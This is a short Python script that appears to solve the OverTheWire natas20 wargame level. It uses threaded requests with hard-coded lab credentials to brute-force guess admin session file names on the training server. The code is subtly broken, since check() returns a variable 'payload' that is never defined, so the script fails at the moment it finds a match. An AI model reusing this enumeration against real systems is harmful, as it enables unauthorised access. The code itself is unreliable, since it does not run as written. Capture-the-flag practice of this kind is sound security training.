import requests
from concurrent.futures import ThreadPoolExecutor, as_completed



def check(i):
    url = f"http://natas20.natas.labs.overthewire.org/tmp/mysess_{i}-admin"
    auth = ("natas20", "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw")
    
    r = requests.get(url, auth=auth)
    
    if "Username: natas21" in r.text:
        return i, payload
    return None

with ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(check, i) for i in range(641)]

    for future in as_completed(futures):
        result = future.result()
        if result:
            i, payload = result
            print(f"[+] Found valid ID: {i}")
            print(f"[+] Payload: {payload}")
            break